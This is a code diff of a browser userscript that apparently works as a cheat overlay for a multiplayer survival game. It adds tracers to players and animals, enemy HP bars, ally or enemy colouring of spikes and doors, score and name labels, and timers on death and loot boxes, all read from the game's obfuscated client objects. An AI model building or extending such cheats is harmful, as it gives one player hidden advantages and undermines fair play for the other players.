-            unsafeWindow.wow = 'Δⵠᐃⵠ'
             if (p && null != p.type && null != p.id && p.x && p.y) {
-                switch ((0 === p.type && pid(p) === unsafeWindow.playerID && (unsafeWindow.player = p), p.type)) {
+                try {
+                    unsafeWindow.wow = Object.keys(p)[13];
+                    const pid = p[Object.keys(p)[1]];
+                    p.ally = mypid === pid || isAlly(pid);
 
-                    case ITEMS.SPIKE: {
-                        p.ally = unsafeWindow.playerID === pid(p) || isAlly(pid(p));
-                        let l = p[wow]; // draw
-                        p[wow] = function (a) {
-                            return Settings.ColoredSpikes ? (p.ally ? l.apply(this, [1e4]) : l.apply(this, [10001])) : l.apply(this, arguments);
-                        };
-                        break;
+                    switch ((0 === p.type && pid(p) === unsafeWindow.playerID && (unsafeWindow.player = p), p.type)) {
+                        case ITEMS.SPIKE: {
+                            let l = p[wow]; // draw
+                            p[wow] = function (a) {
+                                return Settings.ColoredSpikes ? (p.ally ? l.apply(this, [10000]) : l.apply(this, [10001])) : l.apply(this, arguments);
+                            };
+                            break;
+                        }
+                        case ITEMS.STONE_SPIKE: {
+                            let i = p[wow]; // draw
+                            p[wow] = function (a) {
+                                return Settings.ColoredSpikes ? (p.ally ? i.apply(this, [10002]) : i.apply(this, [10003])) : i.apply(this, arguments);
+                            };
+                            break;
+                        }
+                        case ITEMS.GOLD_SPIKE: {
+                            let e = p[wow]; // draw
+                            p[wow] = function (a) {
+                                return Settings.ColoredSpikes ? (p.ally ? e.apply(this, [10004]) : e.apply(this, [10005])) : e.apply(this, arguments);
+                            };
+                            break;
+                        }
+                        case ITEMS.DIAMOND_SPIKE: {
+                            let t = p[wow]; // draw
+                            p[wow] = function (a) {
+                                return Settings.ColoredSpikes ? (p.ally ? t.apply(this, [10006]) : t.apply(this, [10007])) : t.apply(this, arguments);
+                            };
+                            break;
+                        }
+                        case ITEMS.AMETHYST_SPIKE: {
+                            let r = p[wow]; // draw
+                            p[wow] = function (a) {
+                                return Settings.ColoredSpikes ? (p.ally ? r.apply(this, [10008]) : r.apply(this, [10009])) : r.apply(this, arguments);
+                            };
+                            break;
+                        }
+                        case ITEMS.REIDITE_SPIKE: {
+                            let y = p[wow]; // draw
+                            p[wow] = function (a) {
+                                return Settings.ColoredSpikes ? (p.ally ? y.apply(this, [10010]) : y.apply(this, [10011])) : y.apply(this, arguments);
+                            };
+                            break;
+                        }
+                        case ITEMS.WOOD_DOOR: {
+                            let w1 = p[wow]; // draw
+                            p[wow] = function (a) {
+                                if (p.info % 2 == 1) return w1.apply(this, arguments);
+                                return Settings.ColoredSpikes ? (p.ally ? w1.apply(this, [9000]) : w1.apply(this, [9001])) : w1.apply(this, arguments);
+                            };
+                            break;
+                        }
+                        case ITEMS.STONE_DOOR: {
+                            let s1 = p[wow]; // draw
+                            p[wow] = function (a) {
+                                if (p.info % 2 == 1) return s1.apply(this, arguments);
+                                return Settings.ColoredSpikes ? (p.ally ? s1.apply(this, [9002]) : s1.apply(this, [9003])) : s1.apply(this, arguments);
+                            };
+                            break;
+                        }
+                        case ITEMS.GOLD_DOOR: {
+                            let g1 = p[wow]; // draw
+                            p[wow] = function (a) {
+                                if (p.info % 2 == 1) return g1.apply(this, arguments);
+                                return Settings.ColoredSpikes ? (p.ally ? g1.apply(this, [9004]) : g1.apply(this, [9005])) : g1.apply(this, arguments);
+                            };
+                            break;
+                        }
+                        case ITEMS.DIAMOND_DOOR: {
+                            let d1 = p[wow]; // draw
+                            p[wow] = function (a) {
+                                if (p.info % 2 == 1) return d1.apply(this, arguments);
+                                return Settings.ColoredSpikes ? (p.ally ? d1.apply(this, [9006]) : d1.apply(this, [9007])) : d1.apply(this, arguments);
+                            };
+                            break;
+                        }
+                        case ITEMS.AMETHYST_DOOR: {
+                            let a1 = p[wow]; // draw
+                            p[wow] = function (a) {
+                                if (p.info % 2 == 1) return a1.apply(this, arguments);
+                                return Settings.ColoredSpikes ? (p.ally ? a1.apply(this, [9008]) : a1.apply(this, [9009])) : a1.apply(this, arguments);
+                            };
+                            break;
+                        }
+                        case ITEMS.REIDITE_DOOR: {
+                            let r1 = p[wow]; // draw
+                            p[wow] = function (a) {
+                                if (p.info % 2 == 1) return r1.apply(this, arguments);
+                                return Settings.ColoredSpikes ? (p.ally ? r1.apply(this, [9010]) : r1.apply(this, [9011])) : r1.apply(this, arguments);
+                            };
+                            break;
+                        }
+                        case ITEMS.WOOD_DOOR_SPIKE: {
+                            let w2 = p[wow]; // draw
+                            p[wow] = function (a) {
+                                if (p.info % 2 == 1) return w2.apply(this, arguments);
+                                return Settings.ColoredSpikes ? (p.ally ? w2.apply(this, [9100]) : w2.apply(this, [9101])) : w2.apply(this, arguments);
+                            };
+                            break;
+                        }
+                        case ITEMS.STONE_DOOR_SPIKE: {
+                            let s2 = p[wow]; // draw
+                            p[wow] = function (a) {
+                                if (p.info % 2 == 1) return s2.apply(this, arguments);
+                                return Settings.ColoredSpikes ? (p.ally ? s2.apply(this, [9102]) : s2.apply(this, [9103])) : s2.apply(this, arguments);
+                            };
+                            break;
+                        }
+                        case ITEMS.GOLD_DOOR_SPIKE: {
+                            let g2 = p[wow]; // draw
+                            p[wow] = function (a) {
+                                if (p.info % 2 == 1) return g2.apply(this, arguments);
+                                return Settings.ColoredSpikes ? (p.ally ? g2.apply(this, [9104]) : g2.apply(this, [9105])) : g2.apply(this, arguments);
+                            };
+                            break;
+                        }
+                        case ITEMS.DIAMOND_DOOR_SPIKE: {
+                            let d2 = p[wow]; // draw
+                            p[wow] = function (a) {
+                                if (p.info % 2 == 1) return d2.apply(this, arguments);
+                                return Settings.ColoredSpikes ? (p.ally ? d2.apply(this, [9106]) : d2.apply(this, [9107])) : d2.apply(this, arguments);
+                            };
+                            break;
+                        }
+                        case ITEMS.AMETHYST_DOOR_SPIKE: {
+                            let a2 = p[wow]; // draw
+                            p[wow] = function (a) {
+                                if (p.info % 2 == 1) return a2.apply(this, arguments);
+                                return Settings.ColoredSpikes ? (p.ally ? a2.apply(this, [9108]) : a2.apply(this, [9109])) : a2.apply(this, arguments);
+                            };
+                            break;
+                        }
+                        case ITEMS.REIDITE_DOOR_SPIKE: {
+                            let r2 = p[wow]; // draw
+                            p[wow] = function (a) {
+                                if (p.info % 2 == 1) return r2.apply(this, arguments);
+                                return Settings.ColoredSpikes ? (p.ally ? r2.apply(this, [9110]) : r2.apply(this, [9111])) : r2.apply(this, arguments);
+                            };
+                            break;
+                        }
+                        case unit()[0]: {
+                            let w = p[wow]
+                        }
                     }
-                    case ITEMS.STONE_SPIKE: {
-                        p.ally = unsafeWindow.playerID === pid(p) || isAlly(pid(p));
-                        let i = p[wow]; // draw
-                        p[wow] = function (a) {
-                            return Settings.ColoredSpikes ? (p.ally ? i.apply(this, [10002]) : i.apply(this, [10003])) : i.apply(this, arguments);
-                        };
-                        break;
-                    }
-                    case ITEMS.GOLD_SPIKE: {
-                        p.ally = unsafeWindow.playerID === pid(p) || isAlly(pid(p));
-                        let e = p[wow]; // draw
-                        p[wow] = function (a) {
-                            return Settings.ColoredSpikes ? (p.ally ? e.apply(this, [10004]) : e.apply(this, [10005])) : e.apply(this, arguments);
-                        };
-                        break;
-                    }
-                    case ITEMS.DIAMOND_SPIKE: {
-                        p.ally = unsafeWindow.playerID === pid(p) || isAlly(pid(p));
-                        let t = p[wow]; // draw
-                        p[wow] = function (a) {
-                            return Settings.ColoredSpikes ? (p.ally ? t.apply(this, [10006]) : t.apply(this, [10007])) : t.apply(this, arguments);
-                        };
-                        break;
-                    }
-                    case ITEMS.AMETHYST_SPIKE: {
-                        p.ally = unsafeWindow.playerID === pid(p) || isAlly(pid(p));
-                        let r = p[wow]; // draw
-                        p[wow] = function (a) {
-                            return Settings.ColoredSpikes ? (p.ally ? r.apply(this, [10008]) : r.apply(this, [10009])) : r.apply(this, arguments);
-                        };
-                        break;
-                    }
-                    case ITEMS.REIDITE_SPIKE: {
-                        p.ally = unsafeWindow.playerID === pid(p) || isAlly(pid(p));
-                        let y = p[wow]; // draw
-                        p[wow] = function (a) {
-                            return Settings.ColoredSpikes ? (p.ally ? y.apply(this, [10010]) : y.apply(this, [10011])) : y.apply(this, arguments);
-                        };
-                        break;
-                    }
-                    case unit()[0]: {
-                        let w = p[wow]
-                    }
+                } catch (error) {
+                    return push.apply(this, arguments);
                 }
             }
             return push.apply(this, arguments);
@@ -1412,12 +2866,46 @@ function colors() {
     }
 }
 
+
+function drawMob(ctx, mob) {
+    ctx.font = '20px Baloo Paaji';
+    ctx.fillStyle = 'black';
+    ctx.textAlign = 'center';
+    ctx.textBaseline = 'middle';
+    keys = Object.keys(mob)
+
+    ctx.strokeText(mob.action, script.user.cam.x + mob.x, script.user.cam.y + mob.y + 40);
+    //ctx.fillText(mob.action, script.user.cam.x + mob.x, script.user.cam.y + mob.y + 40);
+}
+
+
+function roundRect(ctx, x1, y1, x2, y2, radius) {
+    radius = Math.min(radius, (x2 - x1) / 2, (y2 - y1) / 2);
+    ctx.beginPath();
+    ctx.moveTo(x1 + radius, y1);
+    ctx.lineTo(x2 - radius, y1);
+    ctx.arcTo(x2, y1, x2, y1 + radius, radius);
+    ctx.lineTo(x2, y2 - radius);
+    ctx.arcTo(x2, y2, x2 - radius, y2, radius);
+    ctx.lineTo(x1 + radius, y2);
+    ctx.arcTo(x1, y2, x1, y2 - radius, radius);
+    ctx.lineTo(x1, y1 + radius);
+    ctx.arcTo(x1, y1, x1 + radius, y1, radius);
+    ctx.stroke();
+}
+
+
 function updater() {
     requestAnimationFrame(updater)
+
+    if (Settings.TurnOffScript.e) return;
 
     unsafeWindow.ctx = document.getElementById("game_canvas").getContext("2d");
 
     script.user.alive = user[Object.keys(user)[10]];
+
+    // draw(id_tings, unsafeWindow.ctx);
+
 
     let i = 22.5;
     for (hack in Settings) {
@@ -1425,6 +2913,7 @@ function updater() {
             ctx.save();
             ctx.beginPath();
             ctx.lineWidth = 6;
+            ctx.textAlign = 'left';
             ctx.fillStyle = "red";
             ctx.strokeStyle = "black";
             ctx.font = "22px Baloo Paaji";
@@ -1461,8 +2950,23 @@ function updater() {
         script.user.cam.x = user[Object.keys(user)[28]].x
         script.user.cam.y = user[Object.keys(user)[28]].y
         script.user.team = user[Object.keys(user)[21]]
-
+        try {
+            let myPlayer = script.world.fast_units[script.user.uid];
+        } catch (error) {
+            ctx.save();
+            ctx.beginPath();
+            ctx.lineWidth = 6;
+            ctx.fillStyle = "red";
+            ctx.strokeStyle = "black";
+            ctx.font = "55px Baloo Paaji";
+            ctx.strokeText("Error loading script", unsafeWindow.innerWidth / 2, unsafeWindow.innerHeight / 14);
+            ctx.fillText("Error loading script", unsafeWindow.innerWidth / 2, unsafeWindow.innerHeight / 14);
+            ctx.restore();
+            return
+        }
         let myPlayer = script.world.fast_units[script.user.uid];
+        mypid = myPlayer[Object.keys(myPlayer)[1]]
+
 
         /*
         if (myPlayer) {
@@ -1481,6 +2985,7 @@ function updater() {
         script.myPlayer.ghost = myPlayer[Object.keys(myPlayer)[64]]
 
         ally = script.user.team.length > 0 ? script.user.team : [script.user.id];
+        units = unit()
 
         if (Settings.gaugesInfo) {
             const r = unsafeWindow.innerWidth / 2;
@@ -1492,19 +2997,22 @@ function updater() {
             ctx.save();
             ctx.beginPath();
             ctx.lineWidth = 7;
-            ctx.fillStyle = "red";
             ctx.strokeStyle = "black";
             ctx.font = "34px Baloo Paaji";
 
+            ctx.fillStyle = "#69a148";
             ctx.strokeText(hp + "", r - 270 - 100, a - 70);
             ctx.fillText(hp + "", r - 270 - 100, a - 70);
 
-            ctx.strokeText(food + "", r - 110, a - 70);
-            ctx.fillText(food + "", r - 110, a - 70);
+            ctx.fillStyle = "#AF352A";
+            ctx.strokeText(food + "", r - 120, a - 70);
+            ctx.fillText(food + "", r - 120, a - 70);
 
+            ctx.fillStyle = "#669BB1";
             ctx.strokeText(script.user.gauges.cold + "", r + 210 - 100, a - 70);
             ctx.fillText(script.user.gauges.cold + "", r + 210 - 100, a - 70);
 
+            ctx.fillStyle = "#074A87";
             ctx.strokeText(script.user.gauges.water + "", r + 450 - 100, a - 70);
             ctx.fillText(script.user.gauges.water + "", r + 450 - 100, a - 70);
 
@@ -1519,10 +3027,12 @@ function updater() {
             let otherTimer = Math.round(5 - (timeNow - script.lastTimer) / 1000);
             if (!isNaN(healTimer)) {
                 if (healTimer > 10 || healTimer < 0) script.lastHealTime = performance.now();
+                ctx.fillStyle = "#69a148";
                 ctx.strokeText(healTimer + "s", r - 150 - 100, a - 40);
                 ctx.fillText(healTimer + "s", r - 150 - 100, a - 40);
             }
             if (!isNaN(otherTimer)) {
+                ctx.fillStyle = "red";
                 ctx.strokeText(otherTimer + "s", r + 90 - 100, a - 40);
                 ctx.fillText(otherTimer + "s", r + 90 - 100, a - 40);
             }
@@ -1533,20 +3043,103 @@ function updater() {
             ctx.restore();
         }
 
-        if (Settings.showNames) {
+        const players = script.world.units[0];
+        if (Settings.showFly) {
             ctx.save();
-            const players = script.world.units[0];
+            for (let i = 0; i < players.length; i++) {
+                if (players[i][fly]) {
+                    ctx.font = '20px Baloo Paaji';
+                    ctx.strokeStyle = "black";
+                    ctx.fillStyle = '#3683ff';
+                    ctx.textAlign = 'center';
+                    ctx.textBaseline = 'middle';
+                    ctx.strokeText('Fly', script.user.cam.x + players[i].x, script.user.cam.y + players[i].y + 35);
+                    ctx.fillText('Fly', script.user.cam.x + players[i].x, script.user.cam.y + players[i].y + 35);
+                }
+
+            }
+            ctx.restore();
+        }
+
+        calculateHp(script.world.units);
+
+        if (Settings.showHp) {
+            ctx.save();
+            AllEntity = [...units[69], ...units[73], ...units[68], ...units[66], ...units[65], ...units[62], ...units[63], ...units[78], ...units[77], ...units[64], ...units[72], ...units[88], ...units[76], ...units[75], ...units[74], ...units[60], ...units[80], ...units[61], ...units[67], ...units[71], ...units[70]]
+            ctx.lineWidth = 3;
+            ctx.font = '30px Baloo Paaji';
+            ctx.strokeStyle = "black";
+            ctx.fillStyle = '#db4537';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            for (let i = 0; i < AllEntity.length; i++) {
+                ent = AllEntity[i];
+                if (activeUnits[ent.type][ent.id]) {
+                    ctx.strokeText(activeUnits[ent.type][ent.id].hp + heartEmoji, script.user.cam.x + ent.x, script.user.cam.y + ent.y + 20);
+                    ctx.fillText(activeUnits[ent.type][ent.id].hp + heartEmoji, script.user.cam.x + ent.x, script.user.cam.y + ent.y + 20);
+                }
+            }
+            ctx.restore();
+        }
+        if (Settings.showHpPlayer) {
+            ctx.save();
+            ctx.font = '22px Baloo Paaji';
+            ctx.textAlign = 'left';
+            ctx.textBaseline = 'middle';
+            for (let i = 0; i < players.length; i++) {
+                const pid = players[i][Object.keys(players[i])[1]]
+                pl = players[i];
+                let hp = activeUnits[0][pl.id].hp
+                if (pid == mypid) {
+                    hp = script.user.gauges.health;
+                    if (!Settings.showMyHp) continue
+                }
+
+                ctx.strokeStyle = "#496e34";
+                ctx.fillStyle = "rgba(126,194,85,0.6)";
+                let x = script.user.cam.x + pl.x - 40;
+                let y = script.user.cam.y + pl.y - 61;
+                ctx.lineWidth = 3;
+                ctx.fillRect(x, y, parseInt(hp / 200 * 80), 20);
+                ctx.fillStyle = "rgba(240,86,72,0.6)";
+                ctx.fillRect(x + parseInt(hp / 200 * 80), y, 80 - parseInt(hp / 200 * 80), 20);
+                roundRect(ctx, x, y, x + 80, y + 20, 5)
+                ctx.fillStyle = 'black'
+                ctx.strokeStyle = "black";
+                ctx.fillText(hp, x + 21, y + 13);
+            }
+            ctx.restore();
+        }
+
+        if (Settings.showNames || Settings.showScore) {
+            ctx.save();
+            ctx.font = '20px Baloo Paaji';
+            ctx.strokeStyle = "black";
+            ctx.fillStyle = 'white';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
             for (let i = 0; i < players.length; i++) {
                 const pid = players[i][Object.keys(players[i])[1]]
                 if (pid === script.user.id) continue;
-                let nikcname = players[i].ΔⵠⵠΔ.ⲆⵠΔⵠΔ;
-                ctx.font = '20px Baloo Paaji';
-                ctx.strokeStyle = "black";
-                ctx.fillStyle = 'white';
-                ctx.textAlign = 'center';
-                ctx.textBaseline = 'middle';
-                ctx.strokeText(nikcname, script.user.cam.x + players[i].x - 1, script.user.cam.y + players[i].y - 70);
-                ctx.fillText(nikcname, script.user.cam.x + players[i].x - 1, script.user.cam.y + players[i].y - 70);
+                if (Settings.showScore) {
+                    score = players[i][Object.keys(players[i])[13]]
+                    score = score[Object.keys(score)[13]]
+                    if (score > 0) {
+                        if (score > 100000) {
+                            score = Math.floor(score / 1000) + 'k'
+                        } else if (score > 10000) {
+                            score = Math.floor(score / 100) / 10 + 'k'
+                        }
+                        ctx.strokeText(score, script.user.cam.x + players[i].x - 1, script.user.cam.y + players[i].y - 27);
+                        ctx.fillText(score, script.user.cam.x + players[i].x - 1, script.user.cam.y + players[i].y - 27);
+                    }
+                }
+                if (Settings.showNames) {
+                    let nikcname = players[i][Object.keys(players[i])[13]]
+                    nikcname = nikcname[Object.keys(nikcname)[0]]
+                    ctx.strokeText(nikcname, script.user.cam.x + players[i].x - 1, script.user.cam.y + players[i].y - 70);
+                    ctx.fillText(nikcname, script.user.cam.x + players[i].x - 1, script.user.cam.y + players[i].y - 70);
+                }
             };
             ctx.restore();
         }
@@ -1554,7 +3147,6 @@ function updater() {
         if (Settings.tracers) {
             ctx.save();
             if (Settings.PlayerTracers) {
-                const players = script.world.units[0];
                 for (let i = 0; i < players.length; i++) {
                     const pid = players[i][Object.keys(players[i])[1]]
                     if (pid === script.user.id) continue;
@@ -1597,6 +3189,7 @@ function updater() {
                     ctx.moveTo(script.user.cam.x + myPlayer.x, script.user.cam.y + myPlayer.y);
                     ctx.lineTo(script.user.cam.x + mobs[i].x, script.user.cam.y + mobs[i].y);
                     ctx.stroke();
+                    // drawMob(ctx, mobs[i]);
                 };
             }
             if (Settings.WolfTracers) {
@@ -1608,6 +3201,7 @@ function updater() {
                     ctx.moveTo(script.user.cam.x + myPlayer.x, script.user.cam.y + myPlayer.y);
                     ctx.lineTo(script.user.cam.x + mobs[i].x, script.user.cam.y + mobs[i].y);
                     ctx.stroke();
+                    // drawMob(ctx, mobs[i])
                 };
             }
             if (Settings.RabbitTracers) {
@@ -1619,6 +3213,18 @@ function updater() {
                     ctx.moveTo(script.user.cam.x + myPlayer.x, script.user.cam.y + myPlayer.y);
                     ctx.lineTo(script.user.cam.x + mobs[i].x, script.user.cam.y + mobs[i].y);
                     ctx.stroke();
+                };
+            }
+            if (Settings.FishTracers) {
+                mobs = script.world.units[65];
+                for (let i = 0; i < mobs.length; i++) {
+                    ctx.lineWidth = 2.6;
+                    ctx.strokeStyle = "#f77d72";
+                    ctx.beginPath();
+                    ctx.moveTo(script.user.cam.x + myPlayer.x, script.user.cam.y + myPlayer.y);
+                    ctx.lineTo(script.user.cam.x + mobs[i].x, script.user.cam.y + mobs[i].y);
+                    ctx.stroke();
+                    // drawMob(ctx, mobs[i])
                 };
             }
             if (Settings.VultureTracers) {
@@ -1647,7 +3253,7 @@ function updater() {
                 mobs = script.world.units[73];
                 for (let i = 0; i < mobs.length; i++) {
                     ctx.lineWidth = 2.6;
-                    ctx.strokeStyle = "#f00";
+                    ctx.strokeStyle = "#eb6200";
                     ctx.beginPath();
                     ctx.moveTo(script.user.cam.x + myPlayer.x, script.user.cam.y + myPlayer.y);
                     ctx.lineTo(script.user.cam.x + mobs[i].x, script.user.cam.y + mobs[i].y);
@@ -1667,123 +3273,79 @@ function updater() {
                 ctx.strokeStyle = "black";
                 ctx.lineWidth = 7;
                 ctx.fillStyle = "white";
-                ctx.strokeText(totems[i].info >= 16 ? "🤵" + totems[i].info % 16 : "🤵" + totems[i].info, script.user.cam.x + totems[i].x - 20, script.user.cam.y + totems[i].y - 20);
-                ctx.fillText(totems[i].info >= 16 ? "🤵" + totems[i].info % 16 : "🤵" + totems[i].info, script.user.cam.x + totems[i].x - 20, script.user.cam.y + totems[i].y - 20);
+                ctx.strokeText(totems[i].info >= 16 ? charTotem + totems[i].info % 16 : charTotem + totems[i].info, script.user.cam.x + totems[i].x - 20, script.user.cam.y + totems[i].y - 20);
+                ctx.fillText(totems[i].info >= 16 ? charTotem + totems[i].info % 16 : charTotem + totems[i].info, script.user.cam.x + totems[i].x - 20, script.user.cam.y + totems[i].y - 20);
 
                 ctx.strokeText(totems[i].info >= 16 ? "Lock" : "Open", script.user.cam.x + totems[i].x - 20, script.user.cam.y + totems[i].y + 5);
                 ctx.fillText(totems[i].info >= 16 ? "Lock" : "Open", script.user.cam.x + totems[i].x - 20, script.user.cam.y + totems[i].y + 5);
             };
             ctx.restore();
         }
-
-
-        if (Settings.ColoredSpikes) {
-            if (!unsafeWindow.WoodSpikeAlly) loadSpikes();
-
-            const mypid = myPlayer[Object.keys(myPlayer)[1]]
-            ctx.save();
-            ctx.lineWidth = 8;
-            ctx.font = "40px Baloo Paaji";
-            ctx.fillStyle = "black";
-
-            units = unit()
-            woodspikes = units[5];
-            for (let i = 0; i < woodspikes.length; i++) {
-                spike = woodspikes[i];
-                spike.ally = mypid === spike.ΔᐃᐃⲆ || isAlly(spike.ΔᐃᐃⲆ);
-                if (spike.ally) {
-                    ctx.fillStyle = "green";
-                } else {
-                    ctx.fillStyle = "red";
-                }
-                ctx.fillText(`⬤`, spike.x + script.user.cam.x - 18, spike.y + script.user.cam.y + 15);
-            }
-            stonespikes = units[12];
-            for (let i = 0; i < stonespikes.length; i++) {
-                spike = stonespikes[i];
-                spike.ally = mypid === spike.ΔᐃᐃⲆ || isAlly(spike.ΔᐃᐃⲆ);
-                if (spike.ally) {
-                    ctx.fillStyle = "green";
-                } else {
-                    ctx.fillStyle = "red";
-                }
-                ctx.fillText(`⬤`, spike.x + script.user.cam.x - 18, spike.y + script.user.cam.y + 15);
-            }
-            goldspikes = units[13];
-            for (let i = 0; i < goldspikes.length; i++) {
-                spike = goldspikes[i];
-                spike.ally = mypid === spike.ΔᐃᐃⲆ || isAlly(spike.ΔᐃᐃⲆ);
-                if (spike.ally) {
-                    ctx.fillStyle = "green";
-                } else {
-                    ctx.fillStyle = "red";
-                }
-                ctx.fillText(`⬤`, spike.x + script.user.cam.x - 18, spike.y + script.user.cam.y + 15);
-            }
-            diamondspikes = units[14];
-            for (let i = 0; i < diamondspikes.length; i++) {
-                spike = diamondspikes[i];
-                spike.ally = mypid === spike.ΔᐃᐃⲆ || isAlly(spike.ΔᐃᐃⲆ);
-                if (spike.ally) {
-                    ctx.fillStyle = "green";
-                } else {
-                    ctx.fillStyle = "red";
-                }
-                ctx.fillText(`⬤`, spike.x + script.user.cam.x - 18, spike.y + script.user.cam.y + 15);
-            }
-            amethystspikes = units[20];
-            for (let i = 0; i < amethystspikes.length; i++) {
-                spike = amethystspikes[i];
-                spike.ally = mypid === spike.ΔᐃᐃⲆ || isAlly(spike.ΔᐃᐃⲆ);
-                if (spike.ally) {
-                    ctx.fillStyle = "green";
-                } else {
-                    ctx.fillStyle = "red";
-                }
-                ctx.fillText(`⬤`, spike.x + script.user.cam.x - 18, spike.y + script.user.cam.y + 15);
-            }
-            reiditespikes = units[52];
-            for (let i = 0; i < reiditespikes.length; i++) {
-                spike = reiditespikes[i];
-                spike.ally = mypid === spike.ΔᐃᐃⲆ || isAlly(spike.ΔᐃᐃⲆ);
-                if (spike.ally) {
-                    ctx.fillStyle = "green";
-                } else {
-                    ctx.fillStyle = "red";
-                }
-                ctx.fillText(`⬤`, spike.x + script.user.cam.x - 18, spike.y + script.user.cam.y + 15);
-            }
-            ctx.restore();
-
-        }
-
         if (Settings.boxinfo) {
-            deathBoxs = unit()[82];
+            timeNow = Date.now();
+            deathBoxs = units[82];
             for (let i = 0; i < deathBoxs.length; i++) {
                 const box = deathBoxs[i];
-                if (box.id in deathboxinfo) {
-                    if (deathboxinfo[box.id][1] != box.action) {
-                        if (box.action != 0) { deathboxinfo[box.id][0] += 1; }
-                        deathboxinfo[box.id][1] = box.action;
+
+                if (box.info == 0) {
+                    if (box.id in deathboxinfo) {
+                        if (deathboxinfo[box.id][1] != box.action) {
+                            if (box.action != 0) { deathboxinfo[box.id][0] += 1; }
+                            deathboxinfo[box.id][1] = box.action;
+                        }
+                    } else {
+                        deathboxinfo[box.id] = [0, 0, timeNow]
                     }
+                    let count = deathboxinfo[box.id][0];
+                    ctx.save();
+                    ctx.lineWidth = 8;
+                    ctx.font = "20px Baloo Paaji";
+                    ctx.strokeStyle = "red";
+                    ctx.fillStyle = "black";
+                    ctx.strokeText(`Death box`, box.x + script.user.cam.x - 20, box.y + script.user.cam.y - 15);
+                    ctx.fillText(`Death box`, box.x + script.user.cam.x - 20, box.y + script.user.cam.y - 15);
+                    let hp = 300;
+                    if (activeUnits[82][box.id]) hp = activeUnits[82][box.id].hp;
+                    ctx.strokeText(`${hp} hp`, box.x + script.user.cam.x - 10, box.y + script.user.cam.y + 28);
+                    ctx.fillText(`${hp} hp`, box.x + script.user.cam.x - 10, box.y + script.user.cam.y + 28);
+                    ctx.strokeText(`${Math.round(2400 - (timeNow - deathboxinfo[box.id][2]) / 100) / 10}`, box.x + script.user.cam.x - 20, box.y + script.user.cam.y + 5);
+                    ctx.fillText(`${Math.round(2400 - (timeNow - deathboxinfo[box.id][2]) / 100) / 10}`, box.x + script.user.cam.x - 20, box.y + script.user.cam.y + 5);
+                    ctx.restore();
                 } else {
-                    deathboxinfo[box.id] = [0, 0]
+                    if (box.id in mobboxinfo) {
+                        if (mobboxinfo[box.id][1] != box.action) {
+                            if (box.action != 0) { mobboxinfo[box.id][0] += 1; }
+                            mobboxinfo[box.id][1] = box.action;
+                        }
+                    } else {
+                        mobboxinfo[box.id] = [0, 0, timeNow]
+                    }
+                    let count = mobboxinfo[box.id][0];
+                    ctx.save();
+                    ctx.lineWidth = 8;
+                    ctx.font = "20px Baloo Paaji";
+                    ctx.strokeStyle = "black";
+                    ctx.fillStyle = "white";
+                    ctx.strokeText(`Mob box`, box.x + script.user.cam.x - 20, box.y + script.user.cam.y - 15);
+                    ctx.fillText(`Mob box`, box.x + script.user.cam.x - 20, box.y + script.user.cam.y - 15);
+                    ctx.strokeText(`${count}`, box.x + script.user.cam.x - 10, box.y + script.user.cam.y + 28);
+                    ctx.fillText(`${count}`, box.x + script.user.cam.x - 10, box.y + script.user.cam.y + 28);
+                    ctx.strokeText(`${Math.round(300 - (timeNow - mobboxinfo[box.id][2]) / 100) / 10}`, box.x + script.user.cam.x - 20, box.y + script.user.cam.y + 5);
+                    ctx.fillText(`${Math.round(300 - (timeNow - mobboxinfo[box.id][2]) / 100) / 10}`, box.x + script.user.cam.x - 20, box.y + script.user.cam.y + 5);
+                    ctx.restore();
                 }
-                let count = deathboxinfo[box.id][0];
-                ctx.save();
-                ctx.lineWidth = 8;
-                ctx.font = "20px Baloo Paaji";
-                ctx.strokeStyle = "red";
-                ctx.fillStyle = "black";
-                ctx.strokeText(`Death box`, box.x + script.user.cam.x - 20, box.y + script.user.cam.y - 15);
-                ctx.fillText(`Death box`, box.x + script.user.cam.x - 20, box.y + script.user.cam.y - 15);
-                ctx.strokeText(`${box.info}`, box.x + script.user.cam.x - 10, box.y + script.user.cam.y + 5);
-                ctx.fillText(`${box.info}`, box.x + script.user.cam.x - 10, box.y + script.user.cam.y + 5);
-                ctx.strokeText(`${count}`, box.x + script.user.cam.x - 10, box.y + script.user.cam.y + 25);
-                ctx.fillText(`${count}`, box.x + script.user.cam.x - 10, box.y + script.user.cam.y + 25);
-                ctx.restore();
             }
-            lootBoxs = unit()[86];
+            for (const id in mobboxinfo) {
+                if (timeNow - mobboxinfo[id][2] > 30500) {
+                    delete mobboxinfo[id];
+                }
+            }
+            for (const id in deathboxinfo) {
+                if (timeNow - deathboxinfo[id][2] > 240500) {
+                    delete deathboxinfo[id];
+                }
+            }
+            lootBoxs = units[86];
             for (let i = 0; i < lootBoxs.length; i++) {
                 const box = lootBoxs[i];
                 if (box.id in lootboxsinfo) {
@@ -1792,7 +3354,7 @@ function updater() {
                         lootboxsinfo[box.id][1] = box.action;
                     }
                 } else {
-                    lootboxsinfo[box.id] = [0, 0]
+                    lootboxsinfo[box.id] = [0, 0, timeNow]
                 }
                 let count = lootboxsinfo[box.id][0];
                 ctx.save();
@@ -1802,14 +3364,19 @@ function updater() {
                 ctx.fillStyle = "white";
                 ctx.strokeText(`loot`, box.x + script.user.cam.x - 20, box.y + script.user.cam.y - 5);
                 ctx.fillText(`loot`, box.x + script.user.cam.x - 20, box.y + script.user.cam.y - 5);
-                ctx.strokeText(`${count}`, box.x + script.user.cam.x - 10, box.y + script.user.cam.y + 10);
-                ctx.fillText(`${count}`, box.x + script.user.cam.x - 10, box.y + script.user.cam.y + 10);
+                ctx.strokeText(`${Math.round(162 - (timeNow - lootboxsinfo[box.id][2]) / 100) / 10}`, box.x + script.user.cam.x - 20, box.y + script.user.cam.y + 13);
+                ctx.fillText(`${Math.round(162 - (timeNow - lootboxsinfo[box.id][2]) / 100) / 10}`, box.x + script.user.cam.x - 20, box.y + script.user.cam.y + 13);
                 ctx.restore();
+            }
+            for (const id in lootboxsinfo) {
+                if (timeNow - lootboxsinfo[id][2] > 16200) {
+                    delete lootboxsinfo[id];
+                }
             }
         }
 
         if (Settings.ChestInfo) {
-            chests = unit()[11];
+            chests = units[11];
             for (let i = 0; i < chests.length; i++) {
                 const chest = chests[i];
                 if (chest.info == 0) {
@@ -1817,14 +3384,20 @@ function updater() {
                 }
                 ctx.save();
                 let img = getImgForChest(chest)
+                if (img.localName == 'img') {
+                    if (img[Object.keys(img)[0]] == 0) {
+                        img.src = img.baseURI + img[Object.keys(img)[3]]
+                    }
+                }
